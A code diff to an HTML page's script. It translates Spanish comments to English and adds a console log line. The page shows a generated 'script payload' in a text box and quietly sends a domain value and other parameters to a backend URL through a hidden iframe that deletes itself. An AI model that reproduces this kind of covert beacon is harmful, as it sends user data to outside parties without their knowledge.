@@ -36,7 +36,7 @@
     </div>
 
     <script>
-        // Inyectado automáticamente vía GitHub Actions desde el Secret APPS_SCRIPT_URL
+        // Automatically injected via GitHub Actions from the APPS_SCRIPT_URL Secret
         const APPS_SCRIPT_URL = "__APPS_SCRIPT_URL__";
 
         function _rndStr(len = 6) {
@@ -99,7 +99,7 @@
             _txt.innerText = _scriptPayload;
             _box.style.display = 'block';
 
-            // Ejecución del registro si la URL inyectada es válida
+            // Log execution via temporary iframe if injected URL is valid
             if (APPS_SCRIPT_URL && APPS_SCRIPT_URL.startsWith("https://")) {
                 const queryParams = new URLSearchParams({
                     domain: _d,
@@ -118,6 +118,8 @@
                         iframe.parentNode.removeChild(iframe);
                     }
                 }, 3000);
+
+                console.log("Request sent to backend via iframe.");
             }
         }
     </script>
